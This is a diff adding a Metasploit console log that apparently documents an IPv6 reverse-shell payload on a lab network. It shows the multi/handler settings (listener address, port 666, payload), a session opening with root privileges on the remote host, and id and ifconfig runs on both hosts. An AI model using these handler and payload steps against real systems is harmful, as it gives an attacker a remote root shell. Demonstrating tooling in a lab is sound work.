@@ -1,0 +1,58 @@
+msf exploit(multi/handler) > set LHOST dead:beef::2
+LHOST => dead:beef::2
+msf exploit(multi/handler) > set LPORT 666
+LPORT => 666
+msf exploit(multi/handler) > set PAYLOAD linux/x86/shell_reverse_tcp_ipv6 
+PAYLOAD => linux/x86/shell_reverse_tcp_ipv6
+msf exploit(multi/handler) > exploit -j -z
+[*] Exploit running as background job 0.
+
+[*] Started reverse TCP handler on dead:beef::2:666 
+msf exploit(multi/handler) > [*] Command shell session 1 opened (dead:beef::2:666 -> dead:beef::1:40278) at 2018-05-29 18:23:57 +0200
+
+msf exploit(multi/handler) > sessions 1
+[*] Starting interaction with 1...
+
+/bin/bash
+id
+uid=0(root) gid=0(root) groups=0(root)
+/bin/bash
+/bin/sh
+id
+uid=0(root) gid=0(root) groups=0(root)
+ifconfig | grep inet
+        inet 10.0.1.14  netmask 255.255.255.0  broadcast 10.0.1.255
+        inet6 fe80::20c:29ff:fe9d:53c9  prefixlen 64  scopeid 0x20<link>
+        inet6 dead:beef::1  prefixlen 64  scopeid 0x0<global>
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+ifconfig | grep inet6
+        inet6 fe80::20c:29ff:fe9d:53c9  prefixlen 64  scopeid 0x20<link>
+        inet6 dead:beef::1  prefixlen 64  scopeid 0x0<global>
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+
+msf exploit(multi/handler) > ifconfig
+[*] exec: ifconfig
+
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.1.15  netmask 255.255.255.0  broadcast 10.0.1.255
+        inet6 fe80::20c:29ff:fe77:332c  prefixlen 64  scopeid 0x20<link>
+        inet6 dead:beef::2  prefixlen 64  scopeid 0x0<global>
+        ether 00:0c:29:77:33:2c  txqueuelen 1000  (Ethernet)
+        RX packets 448026  bytes 671045652 (639.9 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 183219  bytes 11086985 (10.5 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 32  bytes 1584 (1.5 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 32  bytes 1584 (1.5 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+
